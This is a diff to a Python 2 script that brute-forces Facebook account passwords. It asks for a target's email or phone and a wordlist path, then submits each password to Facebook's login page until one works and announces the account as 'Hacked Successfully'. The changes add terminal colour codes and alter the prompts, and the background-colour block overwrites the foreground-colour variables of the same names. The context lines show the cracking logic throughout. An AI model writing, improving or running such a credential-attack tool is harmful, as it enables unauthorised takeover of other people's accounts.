@@ -1,6 +1,35 @@
-#!/usr/bin/env python
-# -*- coding: UTF-8 -*-
+reset='\033[0m'
+bold='\033[01m'
+disable='\033[02m'
+underline='\033[04m'
+reverse='\033[07m'
+strikethrough='\033[09m'
+invisible='\033[08m'
+    
+black='\033[30m'
+red='\033[31m'
+green='\033[32m'
+orange='\033[33m'
+blue='\033[34m'
+purple='\033[35m'
+cyan='\033[36m'
+lightgrey='\033[37m'
+darkgrey='\033[90m'
+lightred='\033[91m'
+lightgreen='\033[92m'
+yellow='\033[93m'
+lightblue='\033[94m'
+pink='\033[95m'
+lightcyan='\033[96m'
 
+black='\033[40m'
+red='\033[41m'
+green='\033[42m'
+orange='\033[43m'
+blue='\033[44m'
+purple='\033[45m'
+cyan='\033[46m'
+lightgrey='\033[47m'
 
 
 import sys,time,os
@@ -9,7 +38,7 @@ import cookielib
 import random
 os.system('clear')
 print ('Edmark.net')
-time.sleep(3.0)
+
 os.system('clear')
 
 
@@ -23,10 +52,10 @@ print
 
 
 #email
-email = str(raw_input("\n\nEmail or Phone: "))
+email = str(raw_input(cyan + "\n\nEmail or Phone: " + reset))
 wp = 'wordlist.txt'
 #wordlist
-passwordlist = str(raw_input("Wordlist Path : or (enter if its already) ")) + wp
+passwordlist = str(raw_input(cyan + "WordListPath / Enter to Start: " + reset)) + wp
 
 #Target Website
 login = 'https://www.facebook.com/login.php?login_attempt=1'
@@ -64,13 +93,14 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print("\n[+] Email/Phone: " + email + " Password: {}".format(password))
-			print("[+] " + email + " Has been Hacked Successfully!!!") 
+			print(green + "\n[+] Email/Phone: " + email + " Password: {}".format(password))
+			print(green + "[+] " + email + " Has been Hacked Successfully!!!" + reset) 
 			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
 			if m == 'y':
 				exit()
-			elif m == 'n': 
-				os.system("fc.py")
+			elif m == 'n':
+				os.system("clear")
+				os.system("python2 fb.py")
 				
 
 
@@ -88,10 +118,9 @@ def welcome():
 	total = total.readlines()
 	print
 	print (" [*] Account to crack : {}".format(email))
-	print (" [*] Loaded :" , len(total) , "passwords")
+	print " [*] Possible Password: " , len(total)
 	print (" [*] Cracking, please wait ...\n\n")
 
 
 if __name__ == '__main__':
 	main()
-
